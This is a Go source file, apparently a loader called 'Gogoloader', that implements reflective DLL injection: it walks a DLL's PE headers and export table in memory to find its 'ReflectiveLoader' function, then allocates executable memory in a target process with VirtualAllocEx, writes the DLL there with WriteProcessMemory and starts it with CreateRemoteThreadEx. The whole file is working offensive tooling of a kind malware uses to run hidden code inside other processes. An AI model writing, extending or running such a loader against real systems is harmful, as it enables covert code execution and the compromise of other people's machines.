package inject

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
)

type NT_Headers32 struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader32
}
type NT_Headers64 struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader64
}
type Section struct {
	Header  ImageSectionHeader
	Entropy *float64
}
type ImageSectionHeader struct {
	Name                 [8]uint8
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}
type ImageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

func Testfun() {
	fmt.Println("cc from load lib")
}

func GrabStringFromPtr(ptr uintptr) (string, error) {
	extracted_string := make([]byte, 2)
	char := *(*byte)(unsafe.Pointer(ptr))
	next_char := *(*byte)(unsafe.Pointer(ptr)) // Dirty way to stop just before getting the null byte of the end
	index := 0
	for next_char != 0 {
		char = *(*byte)(unsafe.Pointer(ptr + uintptr(index)))
		extracted_string = append(extracted_string, char)
		index++
		next_char = *(*byte)(unsafe.Pointer(ptr + uintptr(index)))
	}
	return string(extracted_string[:]), nil
}
func RVA2OFFSET(dwRva uint32, uiBaseAddress uintptr) (uint32, error) {
	struct_DosHeader := (*pe.DosHeader)(unsafe.Pointer(uiBaseAddress))
	uiExportDir := uiBaseAddress + uintptr(struct_DosHeader.AddressOfNewExeHeader)
	//struct_NT_Headers := (*NT_Headers32)(unsafe.Pointer(uiExportDir))
	var struct_NT_Headers32 *NT_Headers32
	var struct_NT_Headers64 *NT_Headers64
	if runtime.GOARCH == "386" {
		struct_NT_Headers32 = (*NT_Headers32)(unsafe.Pointer(uiExportDir))
	} else if runtime.GOARCH == "amd64" {
		struct_NT_Headers64 = (*NT_Headers64)(unsafe.Pointer(uiExportDir))
	}
	//fmt.Printf("struct_NT_Headers : %T\n", struct_NT_Headers)

	// On additionne l'adresse de OptionalHeader32 avec la taille de  OptionalHeader32 afin d' arriver a la section suivante
	// qui est Section Headers
	var pSectionHeader uintptr
	if runtime.GOARCH == "386" {
		pSectionHeader = uintptr(unsafe.Pointer(&struct_NT_Headers32.OptionalHeader)) + uintptr(struct_NT_Headers32.FileHeader.SizeOfOptionalHeader)
	} else if runtime.GOARCH == "amd64" {
		pSectionHeader = uintptr(unsafe.Pointer(&struct_NT_Headers64.OptionalHeader)) + uintptr(struct_NT_Headers64.FileHeader.SizeOfOptionalHeader)
	}
	//fmt.Printf("pSectionHeader : %v\n", *(*byte)(unsafe.Pointer(pSectionHeader)))

	// On va pouvoir caster ca dans la struct approopriée
	// Cette partie sert à récupérer chaque structure ImageSectionHeader (.text,.rdata,.data etc.)  dans un tableau de struct
	// J'itère juste depuis le début des Sections Headers trouvé plus haut en décalant de 40 bytes à chaque fois

	//nb_of_section := int(struct_NT_Headers.FileHeader.NumberOfSections)
	var nb_of_section int
	if runtime.GOARCH == "386" {
		nb_of_section = int(struct_NT_Headers32.FileHeader.NumberOfSections)
	} else if runtime.GOARCH == "amd64" {
		nb_of_section = int(struct_NT_Headers64.FileHeader.NumberOfSections)
	}
	sectionHeaders := make([]ImageSectionHeader, nb_of_section) // Init d'un tableau de ImageSectionHeader de la taille du mn de sections
	next_block_offset := uintptr(0)
	index := 0
	for index <= nb_of_section-1 {
		next_section_offset := pSectionHeader + next_block_offset
		sectionHeaders[index] = *(*ImageSectionHeader)(unsafe.Pointer(next_section_offset))
		//fmt.Printf("sectionHeaders[%v].PointerToRawData : %v\n", index, sectionHeaders[index].PointerToRawData)
		next_block_offset += uintptr(40)
		index++
	}

	if dwRva < sectionHeaders[0].PointerToRawData { // Cette vérification est effectuée pour déterminer si dwRva tombe dans les en-têtes ou d'autres données
		return dwRva, nil // qui ne sont pas contenues dans une section. Dans un fichier exécutable Portable Executable (PE),
		// les en-têtes et autres données qui se trouvent avant la première section sont directement mappés en
		// mémoire lorsque le fichier PE est chargé, et leur RVA est identique à leur décalage de fichier. Par conséquent,
		// si dwRva se situe avant les données brutes de la première section dans le fichier PE, il est considéré comme
		// étant déjà une valeur de décalage de fichier valide et ne nécessite pas de conversion supplémentaire.
	} else {
		index = 0
		for index <= nb_of_section-1 {
			if dwRva >= sectionHeaders[index].VirtualAddress && dwRva < (sectionHeaders[index].VirtualAddress+sectionHeaders[index].SizeOfRawData) {
				file_offset := dwRva - sectionHeaders[index].VirtualAddress + sectionHeaders[index].PointerToRawData
				//fmt.Printf("file_offset : %v\n", file_offset)
				return file_offset, nil
			}
			index++
		}
	}
	// b := make([]byte, 4)
	// binary.BigEndian.PutUint32(b, first_section_offset)
	// fmt.Printf("struct_SectionHeader : %v\n", hex.EncodeToString(b))
	return uint32(4), nil
}
func GetReflectiveLoaderOffset(lpReflectiveDllBuffer uintptr) (uint32, error) {
	var (
		uiBaseAddress uintptr = 0
		uiExportDir   uintptr = 0
		// uiNameArray    uintptr = 0
		// uiAddressArray uintptr = 0
		// uiNameOrdinals uintptr = 0
		// dwCounter      uint32  = 0
		// dwCompiledArch uint32  = 1
	)

	fmt.Printf("lpReflectiveDllBuffer :%v\n", lpReflectiveDllBuffer)

	// 1. Get E_lfanew content (offset to NT Headers struct) from DOS Header struct
	uiBaseAddress = uintptr(lpReflectiveDllBuffer)
	//uiBaseAddress pointe le début de inject.dll contenu en mémoiree
	fmt.Printf("uiBaseAddress :%v\n", uiBaseAddress)
	struct_DosHeader := (*pe.DosHeader)(unsafe.Pointer(uiBaseAddress))            //contient la structure DOS Header de inject.dll récuprérée à partir du début de la dll en meémoire
	uiExportDir = uiBaseAddress + uintptr(struct_DosHeader.AddressOfNewExeHeader) // E_lfanew = AddressOfNewExeHeader is the last member of the DOS header structure, it’s located at offset 0x3C into the DOS header and it holds an offset to the start of the NT headers. This member is important to the PE loader on Windows systems because it tells the loader where to look for the file header.
	// uiExportDir contient l'adresse du début de inject.dll + le contenue de AddressOfNewExeHeader qui fait partie de la struct DosHeader
	// Si on print uintptr((*pe.DosHeader)(unsafe.Pointer(uiBaseAddress)).AddressOfNewExeHeader) on va avoir la valeur (OFFSET) contenue dans AddressOfNewExeHeader
	// Si on print  *(*byte)(unsafe.Pointer(uiExportDir)) on va voir "PE" qui marque le début de NT headers
	fmt.Printf("uiExportDir :%v\n", uiExportDir)

	// 2. Get magic from Nt Headers struct
	var struct_NT_Headers32 *NT_Headers32
	var struct_NT_Headers64 *NT_Headers64
	if runtime.GOARCH == "386" {
		struct_NT_Headers32 = (*NT_Headers32)(unsafe.Pointer(uiExportDir))
	} else if runtime.GOARCH == "amd64" {
		struct_NT_Headers64 = (*NT_Headers64)(unsafe.Pointer(uiExportDir))
	}

	//struct_NT_Headers64 := (*NT_Headers64)(unsafe.Pointer(uiExportDir))
	//magic := struct_NT_Headers.OptionalHeader32.Magic
	var magic uint16
	if runtime.GOARCH == "386" {
		magic = struct_NT_Headers32.OptionalHeader.Magic
	} else if runtime.GOARCH == "amd64" {
		magic = struct_NT_Headers64.OptionalHeader.Magic
		fmt.Printf("MSP magic :%v\n", magic)
	}
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, magic)
	fmt.Printf("magic :%v\n", hex.EncodeToString(b))

	// 2.1 Check if the dll is 32 bits and if the running program is also 32 bits
	if hex.EncodeToString(b) == "010b" { // check if the dll is 32 bits
		if runtime.GOARCH != "386" { // $env:GOARCH="386" to compile it to 3 bits
			fmt.Println(runtime.GOARCH)
			return 0, fmt.Errorf("ERROR - Gogoloader is :%v. But binary is 32 bits.", runtime.GOARCH)
		}
	} else if hex.EncodeToString(b) == "020b" {
		if runtime.GOARCH != "amd64" { // $env:GOARCH="386" to compile it to 3 bits
			fmt.Println(runtime.GOARCH)
			return 0, fmt.Errorf("ERROR - Gogoloader is :%v. But binary is 64 bits.", runtime.GOARCH)
		}
	}

	// 3. Get the address of DataDirectory
	//DataDirectory_address := struct_NT_Headers.OptionalHeader32.DataDirectory
	var DataDirectory_address [16]pe.DataDirectory
	if runtime.GOARCH == "386" {
		DataDirectory_address = struct_NT_Headers32.OptionalHeader.DataDirectory
		fmt.Printf("MSP 386 DataDirectory_address : %v\n ", DataDirectory_address)
	} else if runtime.GOARCH == "amd64" {
		DataDirectory_address = struct_NT_Headers64.OptionalHeader.DataDirectory
		fmt.Printf("MSP amd64 DataDirectory_address : %v\n ", DataDirectory_address)
	}
	// 3.optionnal Get the address of the Export directory
	DataDirectory_export_adress := DataDirectory_address[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	fmt.Printf("MSP DataDirectory_export_adress :%x\n", DataDirectory_export_adress)

	// 3.optionnal Convert it to hex value
	c := make([]byte, 4)
	binary.BigEndian.PutUint32(c, DataDirectory_export_adress)
	DataDirectory_export_adress_hex := hex.EncodeToString(c) // We finally get the rva of the export Export Directory
	fmt.Printf("DataDirectory_address :%x\n", DataDirectory_export_adress_hex)

	// 3.1 Get the offset of DataDirectory
	DataDirectory_export_file_offset, err := RVA2OFFSET(DataDirectory_export_adress, uiBaseAddress)
	if err != nil {
		fmt.Println("Could not get Export Directory offset. Error : ", err)
	}
	DataDirectory_export_absolut_offset := uintptr(uiBaseAddress) + uintptr(DataDirectory_export_file_offset)

	// 4. Get the address of ImageExportDirectory.AddressOfNames
	struct_ImageExportDirectory := (*ImageExportDirectory)(unsafe.Pointer(DataDirectory_export_absolut_offset))
	ImageExportDirectory_AddressOfNames_address := struct_ImageExportDirectory.AddressOfNames
	fmt.Printf("ImageExportDirectory_AddressOfNames_address : %v\n", ImageExportDirectory_AddressOfNames_address)
	// 4.1 Get the offset of ImageExportDirectory.AddressOfNames
	ImageExportDirectory_AddressOfNames_file_offset, err := RVA2OFFSET(ImageExportDirectory_AddressOfNames_address, uiBaseAddress)
	if err != nil {
		fmt.Println("Could not get Export Directory offset. Error : ", err)
	}
	ImageExportDirectory_AddressOfNames_absolut_offset := uintptr(uiBaseAddress) + uintptr(ImageExportDirectory_AddressOfNames_file_offset)
	fmt.Printf("ImageExportDirectory_AddressOfNames offset :%X\n", ImageExportDirectory_AddressOfNames_file_offset)
	fmt.Printf("ImageExportDirectory_AddressOfNames first byte :%X\n", *(*byte)(unsafe.Pointer(ImageExportDirectory_AddressOfNames_absolut_offset)))

	// 5. Get the address of ImageExportDirectory.AddressOfFunctions
	ImageExportDirectory_AddressOfFunctions_address := struct_ImageExportDirectory.AddressOfFunctions
	fmt.Printf("ImageExportDirectory_AddressOfFunctions_address : %x\n", ImageExportDirectory_AddressOfFunctions_address)
	fmt.Println("MSP ICI")
	//return 0, nil
	// 5.1 Get the offset of ImageExportDirectory.AddressOfFunctions
	ImageExportDirectory_AddressOfFunctions_file_offset, err := RVA2OFFSET(ImageExportDirectory_AddressOfFunctions_address, uiBaseAddress)
	if err != nil {
		fmt.Println("Could not get Export Directory offset. Error : ", err)
	}
	ImageExportDirectory_AddressOfFunctions_absolut_offset := uintptr(uiBaseAddress) + uintptr(ImageExportDirectory_AddressOfFunctions_file_offset)
	fmt.Printf("ImageExportDirectory_AddressOfFunctions first byte :%v\n", *(*byte)(unsafe.Pointer(ImageExportDirectory_AddressOfFunctions_absolut_offset)))

	// 6. Get the address of ImageExportDirectory.AddressOfNameOrdinals
	ImageExportDirectory_AddressOfNameOrdinals_address := struct_ImageExportDirectory.AddressOfNameOrdinals
	fmt.Printf("ImageExportDirectory_AddressOfNameOrdinals_address : %v\n", ImageExportDirectory_AddressOfNameOrdinals_address)
	// 6.1 Get the offset of ImageExportDirectory.AddressOfNameOrdinals
	ImageExportDirectory_AddressOfNameOrdinals_file_offset, err := RVA2OFFSET(ImageExportDirectory_AddressOfNameOrdinals_address, uiBaseAddress)
	if err != nil {
		fmt.Println("Could not get Export Directory offset. Error : ", err)
	}
	ImageExportDirectory_AddressOfNameOrdinals_absolut_offset := uintptr(uiBaseAddress) + uintptr(ImageExportDirectory_AddressOfNameOrdinals_file_offset)
	fmt.Printf("ImageExportDirectory_AddressOfNameOrdinals first byte :%v\n", *(*byte)(unsafe.Pointer(ImageExportDirectory_AddressOfNameOrdinals_absolut_offset)))

	// 7. get a counter for the number of exported functions
	dwCounter := struct_ImageExportDirectory.NumberOfNames
	fmt.Printf("dwCounter :%v\n", dwCounter)

	// 8. loop through all the exported functions to find the ReflectiveLoader

	count := int(dwCounter)
	for count != 0 {
		fmt.Println("count : ", dwCounter)

		// We retrieve the content of AddressOfNames of is address found in previous part. It contains the RVA of the functions names
		ImageExportDirectory_AddressOfNames_absolut_offset_content := *(*uint32)(unsafe.Pointer(uintptr(ImageExportDirectory_AddressOfNames_absolut_offset)))
		ImageExportDirectory_AddressOfNames_absolut_offset_content_offset, err := RVA2OFFSET(ImageExportDirectory_AddressOfNames_absolut_offset_content, uiBaseAddress)
		if err != nil {
			fmt.Println("Could not get the offset of ImageExportDirectory_AddressOfNames_absolut_offset_content. Error : ", err)
		}
		fmt.Printf("ImageExportDirectory_AddressOfNames_absolut_offset_content_offset :%X\n", (ImageExportDirectory_AddressOfNames_absolut_offset_content_offset))

		ImageExportDirectory_AddressOfNames_absolut_offset_content_absolut_offset := uiBaseAddress + uintptr(ImageExportDirectory_AddressOfNames_absolut_offset_content_offset)
		cpExportedFunctionName := *(*byte)(unsafe.Pointer(ImageExportDirectory_AddressOfNames_absolut_offset_content_absolut_offset))
		fmt.Printf("cpExportedFunctionName : %X\n", cpExportedFunctionName)
		ExportedFunction_name, err := GrabStringFromPtr(ImageExportDirectory_AddressOfNames_absolut_offset_content_absolut_offset)
		if err != nil {
			fmt.Println("Error trying to retrieve string from ptr.Error : ", err)
		}
		fmt.Printf("ExportedFunction_nam : %v\n", ExportedFunction_name)
		if strings.Contains(ExportedFunction_name, "Reflective") {
			// use the functions name ordinal as an index into the array of name pointers
			ImageExportDirectory_AddressOfFunctions_absolut_offset += uintptr(*(*uint16)(unsafe.Pointer(uintptr(ImageExportDirectory_AddressOfNameOrdinals_absolut_offset))) * 4) // 4 is for 4 bytes

			//
			toReturn, err := RVA2OFFSET(*(*uint32)(unsafe.Pointer(uintptr(ImageExportDirectory_AddressOfFunctions_absolut_offset))), uiBaseAddress)
			if err != nil {
				fmt.Println("Error trying to retrieve file offset.Error : ", err)
			}
			fmt.Printf("toReturn : %X\n", toReturn)
			return toReturn, nil
		}
		// get the next exported function name
		ImageExportDirectory_AddressOfNames_absolut_offset += 4 // 4 is for 4 bytes

		// get the next exported function name ordinal
		ImageExportDirectory_AddressOfNameOrdinals_absolut_offset += 2 // 4 is for 2 bytes
		count--
	}
	return 0, nil
}

func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32) {
	// var (
	// 	bSuccess                 bool                           = false
	// 	lpRemoteLibraryBuffer    uintptr                        = 0
	// 	lpReflectiveLoader       windows.LPTHREAD_START_ROUTINE = nil
	// 	hThread                  windows.Handle                 = 0
	// 	dwReflectiveLoaderOffset uint32                         = 0
	// 	dwThreadId               uint32                         = 0
	// 	dwCompiledArch           uint32                         = 1
	// )

	dwReflectiveLoaderOffset, err := GetReflectiveLoaderOffset(lpBuffer)
	if err != nil {
		fmt.Println("Could not get Reflective Loader function offset. Error : ", err)
		return
	}
	fmt.Printf("dwReflectiveLoaderOffset : %X\n", dwReflectiveLoaderOffset)

	// alloc memory (RWX) in the host process for the image...
	VirtualAllocEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
	lpRemoteLibraryBuffer, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(dwSize), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if !strings.Contains(err.Error(), "successfully") {
		fmt.Println("Error during VirtualAllocEx. Error : ", err)
	}
	fmt.Printf("lpRemoteLibraryBuffer : %#x\n", lpRemoteLibraryBuffer)
	// write the image into the host process...
	WriteProcessMemory := windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), lpRemoteLibraryBuffer, lpBuffer, uintptr(dwSize))
	if !strings.Contains(err.Error(), "successfully") {
		fmt.Println("Error during VirtualAllocEx. Error : ", err)
	}

	// add the offset to ReflectiveLoader() to the remote library address...
	remoteReflectiveLoaderOffset := lpRemoteLibraryBuffer + uintptr(dwReflectiveLoaderOffset)

	// Create a remote thread in the target process with the ReflectiveLoader function as the entry point
	fmt.Printf("remoteReflectiveLoaderOffset : %#x\n", remoteReflectiveLoaderOffset)
	CreateRemoteThreadEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThreadEx")
	threadHandle, _, err := CreateRemoteThreadEx.Call(uintptr(hProcess), 0, 1024*1024, remoteReflectiveLoaderOffset, lpRemoteLibraryBuffer, 0, 0)
	if !strings.Contains(err.Error(), "successfully") {
		fmt.Println("Error during VirtualAllocEx. Error : ", err)
	}
	if threadHandle == 0 {
		fmt.Println("Failed to create remote thread:", err)
		return
	}
	fmt.Println("Remote thread created successfully!", threadHandle)
}
